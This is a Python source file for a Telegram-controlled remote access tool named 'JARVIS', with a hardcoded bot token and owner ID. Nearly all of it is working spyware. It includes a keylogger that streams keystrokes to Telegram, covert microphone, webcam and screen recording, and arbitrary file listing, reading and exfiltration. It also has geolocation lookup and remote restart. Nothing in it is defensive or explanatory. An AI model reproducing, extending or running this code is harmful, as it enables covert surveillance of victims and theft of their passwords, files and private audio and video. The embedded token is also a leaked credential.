import os
import platform
import ctypes
import time
import tempfile
import cv2
import pyaudio
import wave
from datetime import datetime
import telebot
from PIL import ImageGrab
import requests
import numpy as np
from pynput import keyboard
import subprocess
import shutil
import threading

# ===== CONFIGURATION =====
BOT_TOKEN = "8526824458:AAGPj7-0W2TMPauapKjLeqtxFrBWQ1mrLIU"
YOUR_ID = 6265371619
# =========================

TEMP = os.getenv("TEMP", tempfile.gettempdir())
bot = telebot.TeleBot(BOT_TOKEN)

# ===== FAST KEYLOGGER =====
class KeyLogger:
    def __init__(self, bot_instance, chat_id):
        self.bot = bot_instance
        self.chat_id = chat_id
        self.is_logging = False
        self.listener = None
        self.buffer = []
        
    def on_press(self, key):
        if not self.is_logging: return
            
        try:
            if hasattr(key, 'char') and key.char:
                self.buffer.append(key.char)
            elif key == keyboard.Key.space:
                self.buffer.append(" ")
            elif key == keyboard.Key.enter:
                self.buffer.append("\n")
            
            if len(self.buffer) >= 20:
                self.send_log()
        except: pass
    
    def send_log(self):
        if self.buffer:
            try:
                log_text = "".join(self.buffer)
                self.bot.send_message(self.chat_id, f"⌨️: `{log_text}`", parse_mode='Markdown')
                self.buffer.clear()
            except: pass
    
    def start_logging(self):
        try:
            self.is_logging = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            return True
        except: return False
    
    def stop_logging(self):
        try:
            self.is_logging = False
            if self.buffer: self.send_log()
            if self.listener: self.listener.stop()
            return True
        except: return False

keylogger = None

# ===== INSTANT RESPONSE HELPERS =====
def owner_only(message): return message.chat.id == YOUR_ID

# ===== STARTUP =====
try: bot.send_message(YOUR_ID, f"🚀 JARVIS ONLINE - {os.getlogin()}")
except: pass

# ===== IMPROVED MICROPHONE RECORDING =====
@bot.message_handler(commands=['mic'])
def record_mic(message):
    if not owner_only(message): return
    
    seconds = 10  # Increased default time
    try: 
        if len(message.text.split()) > 1:
            seconds = min(int(message.text.split()[1]), 30)  # Max 30 seconds
    except: pass
    
    try:
        bot.send_message(message.chat.id, f"🎤 Recording {seconds}s audio...")
        audio_file = os.path.join(TEMP, f"mic_{int(time.time())}.wav")
        
        # Audio settings - optimized for smaller files
        CHUNK = 512  # Smaller chunk size
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 16000  # Lower sample rate for smaller files
        
        audio = pyaudio.PyAudio()
        
        # Check available devices
        try:
            stream = audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK,
                input_device_index=None  # Use default device
            )
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Mic access error: {str(e)}")
            audio.terminate()
            return
        
        frames = []
        
        # Record audio in chunks
        for i in range(0, int(RATE / CHUNK * seconds)):
            try:
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            except Exception as e:
                print(f"Audio chunk error: {e}")
                break
        
        # Clean up audio stream
        try:
            stream.stop_stream()
            stream.close()
        except: pass
        audio.terminate()
        
        # Save as WAV file
        try:
            wf = wave.open(audio_file, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Save error: {str(e)}")
            return
        
        # Send audio file with timeout handling
        try:
            file_size = os.path.getsize(audio_file)
            if file_size > 0:
                with open(audio_file, 'rb') as audio_f:
                    bot.send_audio(
                        message.chat.id, 
                        audio_f, 
                        caption=f"🎤 {seconds}s Audio",
                        timeout=60  # Increased timeout
                    )
                os.remove(audio_file)
                bot.send_message(message.chat.id, "✅ Audio sent successfully")
            else:
                bot.send_message(message.chat.id, "❌ No audio recorded")
                if os.path.exists(audio_file):
                    os.remove(audio_file)
                    
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Send error: {str(e)}")
            if os.path.exists(audio_file):
                os.remove(audio_file)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Mic recording failed: {str(e)}")

# ===== ALTERNATIVE MIC RECORDING USING SOUNDDEVICE =====
@bot.message_handler(commands=['mic2'])
def record_mic_alternative(message):
    if not owner_only(message): return
    
    try:
        import sounddevice as sd
        import soundfile as sf
    except:
        bot.send_message(message.chat.id, "❌ Install: pip install sounddevice soundfile")
        return
    
    seconds = 15
    try: 
        if len(message.text.split()) > 1:
            seconds = min(int(message.text.split()[1]), 45)  # Max 45 seconds
    except: pass
    
    try:
        bot.send_message(message.chat.id, f"🎤 Recording {seconds}s (alternative)...")
        audio_file = os.path.join(TEMP, f"mic2_{int(time.time())}.wav")
        
        # Record audio
        fs = 16000  # Sample rate
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()  # Wait until recording is finished
        
        # Save as WAV file
        sf.write(audio_file, recording, fs)
        
        # Send file
        with open(audio_file, 'rb') as audio_f:
            bot.send_audio(message.chat.id, audio_f, caption=f"🎤 {seconds}s Audio")
        os.remove(audio_file)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Alternative mic error: {str(e)}")

# ===== ULTRA-FAST COMMANDS =====

@bot.message_handler(commands=['start'])
def start(message):
    if not owner_only(message): return
    bot.send_message(message.chat.id, "⚡ JARVIS READY - /help")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    if not owner_only(message): return
    help_text = """⚡ JARVIS COMMANDS:

📹 MEDIA:
/screen - Instant screenshot
/record [10] - Screen recording  
/cam - Camera photo
/cam_video [8] - Camera video
/mic [15] - Record microphone (15s max)
/mic2 [30] - Alternative mic (45s max)

⌨️ KEYLOGGER:
/key_start - Start keylogger
/key_stop - Stop keylogger

📁 FILES:
/ls - List files
/download [file] - Download any file
/upload [url] - Download from URL
/read [file] - Read file content
/search [filename] - Search files

🌐 SYSTEM:
/info - System info
/loc - Location
/lock - Lock screen
/restart - Restart PC
/exit - Stop bot"""
    bot.send_message(message.chat.id, help_text)

# ===== INSTANT SCREENSHOT =====
@bot.message_handler(commands=['screen'])
def take_screenshot(message):
    if not owner_only(message): return
    try:
        path = os.path.join(TEMP, "sc.jpg")
        ImageGrab.grab().save(path, quality=60)
        with open(path, 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove(path)
    except: pass

# ===== FAST SCREEN RECORDING =====
@bot.message_handler(commands=['record'])
def screen_record(message):
    if not owner_only(message): return
    
    seconds = 10
    try: seconds = min(int(message.text.split()[1]), 20) 
    except: pass
    
    try:
        bot.send_message(message.chat.id, f"🎥 Recording {seconds}s...")
        output_file = os.path.join(TEMP, f"screen_{int(time.time())}.avi")
        w, h = ImageGrab.grab().size
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_file, fourcc, 10.0, (w, h))
        
        start = time.time()
        while time.time() - start < seconds:
            frame = cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_RGB2BGR)
            out.write(frame)
        
        out.release()
        
        if os.path.getsize(output_file) > 0:
            with open(output_file, 'rb') as vid:
                bot.send_video(message.chat.id, vid, caption=f"🎥 {seconds}s Screen Record", timeout=60)
            os.remove(output_file)
    except Exception as e: 
        bot.send_message(message.chat.id, f"❌ Record error")

# ===== FAST CAMERA SHOT =====
@bot.message_handler(commands=['cam'])
def camera_shot(message):
    if not owner_only(message): return
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            cap.release()
            if ret:
                path = os.path.join(TEMP, "cam.jpg")
                cv2.imwrite(path, frame)
                with open(path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo, caption="📸 Camera Shot")
                os.remove(path)
    except: pass

# ===== CAMERA VIDEO RECORDING =====
@bot.message_handler(commands=['cam_video'])
def camera_video(message):
    if not owner_only(message): return
    
    seconds = 8
    try: seconds = min(int(message.text.split()[1]), 15) 
    except: pass
    
    try:
        bot.send_message(message.chat.id, f"📹 Recording {seconds}s camera...")
        output_file = os.path.join(TEMP, f"cam_vid_{int(time.time())}.avi")
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(message.chat.id, "❌ Camera not found")
            return
            
        w = int(cap.get(3))
        h = int(cap.get(4))
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_file, fourcc, 15.0, (w, h))
        
        start = time.time()
        while time.time() - start < seconds:
            ret, frame = cap.read()
            if ret: out.write(frame)
        
        cap.release()
        out.release()
        
        if os.path.getsize(output_file) > 0:
            with open(output_file, 'rb') as vid:
                bot.send_video(message.chat.id, vid, caption=f"📹 {seconds}s Camera Video", timeout=60)
            os.remove(output_file)
    except: 
        bot.send_message(message.chat.id, "❌ Camera record failed")

# ===== FULL SYSTEM FILE BROWSING =====
@bot.message_handler(commands=['ls'])
def list_files(message):
    if not owner_only(message): return
    try:
        path = "."
        if len(message.text.split()) > 1:
            path = message.text.split()[1]
        
        if not os.path.exists(path):
            bot.send_message(message.chat.id, "❌ Path not found")
            return
            
        if os.path.isfile(path):
            bot.send_message(message.chat.id, f"📄 File: {path}")
            return
            
        items = os.listdir(path)
        files = []
        folders = []
        
        for item in items:
            item_path = os.path.join(path, item)
            if os.path.isfile(item_path):
                size = os.path.getsize(item_path)
                files.append(f"📄 {item} ({size//1024}KB)")
            else:
                folders.append(f"📁 {item}")
        
        result = f"📁 {os.path.abspath(path)}\n\n"
        result += "\n".join(folders[:10]) + "\n"
        result += "\n".join(files[:10])
        
        if len(folders) > 10 or len(files) > 10:
            result += f"\n... +{len(folders)+len(files)-20} more items"
            
        bot.send_message(message.chat.id, result)
    except: pass

# ===== DOWNLOAD ANY FILE =====
@bot.message_handler(commands=['download'])
def download_file(message):
    if not owner_only(message): return
    try:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, "📝 Usage: /download <filepath>")
            return
            
        file_path = message.text.split()[1]
        if not os.path.exists(file_path):
            bot.send_message(message.chat.id, "❌ File not found")
            return
            
        if os.path.getsize(file_path) > 50 * 1024 * 1024:
            bot.send_message(message.chat.id, "❌ File too large (>50MB)")
            return
            
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📎 {os.path.basename(file_path)}", timeout=60)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Download error")

# ===== UPLOAD FROM URL =====
@bot.message_handler(commands=['upload'])
def upload_url(message):
    if not owner_only(message): return
    try:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, "📝 Usage: /upload <url>")
            return
            
        url = message.text.split()[1]
        bot.send_message(message.chat.id, "⬇️ Downloading...")
        
        response = requests.get(url, stream=True, timeout=30)
        if response.status_code == 200:
            file_name = os.path.basename(url)
            if not file_name or '.' not in file_name:
                file_name = f"download_{int(time.time())}.tmp"
                
            file_path = os.path.join(TEMP, file_name)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    
            with open(file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"📥 {file_name}", timeout=60)
            os.remove(file_path)
        else:
            bot.send_message(message.chat.id, "❌ Download failed")
    except: 
        bot.send_message(message.chat.id, "❌ Upload error")

# ===== READ FILE CONTENT =====
@bot.message_handler(commands=['read'])
def read_file(message):
    if not owner_only(message): return
    try:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, "📝 Usage: /read <filepath>")
            return
            
        file_path = message.text.split()[1]
        if not os.path.exists(file_path):
            bot.send_message(message.chat.id, "❌ File not found")
            return
            
        if os.path.getsize(file_path) > 100 * 1024:
            bot.send_message(message.chat.id, "❌ File too large to read")
            return
            
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read(4000)  # Limit to 4000 chars
            bot.send_message(message.chat.id, f"📖 {os.path.basename(file_path)}:\n```\n{content}\n```", parse_mode='Markdown')
    except: 
        bot.send_message(message.chat.id, "❌ Read error")

# ===== SEARCH FILES =====
@bot.message_handler(commands=['search'])
def search_files(message):
    if not owner_only(message): return
    try:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, "📝 Usage: /search <filename>")
            return
            
        search_term = message.text.split()[1]
        results = []
        
        # Search in current directory and subdirectories
        for root, dirs, files in os.walk('.'):
            for file in files:
                if search_term.lower() in file.lower():
                    results.append(os.path.join(root, file))
                    if len(results) >= 10: break
            if len(results) >= 10: break
                
        if results:
            result_text = "🔍 Found:\n" + "\n".join(results[:10])
            if len(results) > 10:
                result_text += f"\n... +{len(results)-10} more"
            bot.send_message(message.chat.id, result_text)
        else:
            bot.send_message(message.chat.id, "❌ No files found")
    except: pass

# ===== FAST KEYLOGGER COMMANDS =====
@bot.message_handler(commands=['key_start'])
def start_keylogger(message):
    if not owner_only(message): return
    global keylogger
    try:
        if not keylogger or not keylogger.is_logging:
            keylogger = KeyLogger(bot, message.chat.id)
            keylogger.start_logging()
            bot.send_message(message.chat.id, "✅ Keylogger ON")
    except: pass

@bot.message_handler(commands=['key_stop'])
def stop_keylogger(message):
    if not owner_only(message): return
    global keylogger
    try:
        if keylogger and keylogger.is_logging:
            keylogger.stop_logging()
            bot.send_message(message.chat.id, "✅ Keylogger OFF")
    except: pass

# ===== SYSTEM INFO =====
@bot.message_handler(commands=['info'])
def system_info(message):
    if not owner_only(message): return
    try:
        info = f"""💻 {platform.system()} {platform.release()}
👤 {os.getlogin()}
📁 {os.getcwd()}
🐍 Python {platform.python_version()}"""
        bot.send_message(message.chat.id, info)
    except: pass

# ===== LOCATION =====
@bot.message_handler(commands=['loc'])
def get_location(message):
    if not owner_only(message): return
    try:
        response = requests.get("http://ip-api.com/json/", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            loc_text = f"📍 {data.get('city', '')}, {data.get('country', '')}\nISP: {data.get('isp', '')}"
            bot.send_message(message.chat.id, loc_text)
            bot.send_location(message.chat.id, data.get('lat'), data.get('lon'))
    except: 
        bot.send_message(message.chat.id, "❌ Location error")

# ===== RESTART PC =====
@bot.message_handler(commands=['restart'])
def restart_pc(message):
    if not owner_only(message): return
    try:
        bot.send_message(message.chat.id, "🔄 Restarting PC in 3s...")
        time.sleep(3)
        if platform.system() == "Windows":
            os.system("shutdown /r /t 1")
        else:
            os.system("reboot")
    except: pass

# ===== LOCK SCREEN =====
@bot.message_handler(commands=['lock'])
def lock_screen(message):
    if not owner_only(message): return
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
        bot.send_message(message.chat.id, "🔒 Screen locked")
    except: pass

# ===== EXIT BOT =====
@bot.message_handler(commands=['exit'])
def exit_bot(message):
    if not owner_only(message): return
    global keylogger
    if keylogger and keylogger.is_logging:
        keylogger.stop_logging()
    bot.send_message(message.chat.id, "🛑 JARVIS OFF")
    os._exit(0)

# ===== MAIN =====
if __name__ == "__main__":
    print("⚡ JARVIS STARTING...")
    try:
        bot.infinity_polling(skip_pending=True, timeout=60)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)